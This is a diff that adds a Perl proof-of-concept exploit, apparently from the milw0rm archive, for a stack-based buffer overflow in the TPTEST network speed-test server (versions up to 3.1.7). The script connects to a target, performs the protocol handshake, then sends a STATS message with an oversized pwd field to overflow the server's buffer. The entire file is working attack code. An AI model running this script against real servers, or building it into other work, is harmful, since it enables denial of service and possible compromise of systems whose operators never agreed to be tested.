@@ -1,0 +1,28 @@
+#!/usr/local/bin/perl
+
+# TPTEST <= 3.1.7 (maby also 5.0.2?)
+# tptest.sourceforge.net
+# stackbased buffer overflow poc in server (client can also be exploit)
+# author: ffwd
+
+use IO::Socket;($host,$port)=@ARGV;
+$rem=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$host,PeerPort=>$port);
+if(!$rem){die "1\n";}$rem->autoflush(1);
+$cookie=$major=$minor="123";
+$r=<$rem>;print "$r";sleep 5; # to attach in gdb..
+if($r=~/cookie=([0-9]*)/){$cookie=$1;}
+if($r=~/vmajor=([0-9]*)/){$major=$1;}
+if($r=~/vminor=([0-9]*)/){$minor=$1;}
+$s="TEST vmajor=$major;vminor=$minor;mode=4;timeout=60;tcpbytes=0;cookie=$cookie;client=\r\n";
+print "$s";print $rem "$s";$rr=<$rem>;print "$rr";
+if($rr=~/^210 tcpdataport=([0-9]*)/)
+{$data=$1;$remm=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$host,PeerPort=>$data);
+if(!$remm){die "2\n";}}
+$ss="STATS majorv=$major;minorv=$minor;pktssent=0;pktsunsent=0;pktsrcvd=0;bytessent=51200;bytesrcvd=0;".
+"maxrtt=0;minrtt=999999999;totrtt=0;nortt=0;oocount=0;txstart_s=7274757975;txstart_us=717574;".
+"txstop_s=7274757975;txstop_us=717173;rxstart_s=0;rxstart_us=0;rxstop_s=0;rxstop_us=0;email=;pwd=".
+("A"x42)."\r\n"; # buffer overflow!
+print "$ss";print $rem "$ss";
+print while <$rem>;
+
+# milw0rm.com [2009-02-16]
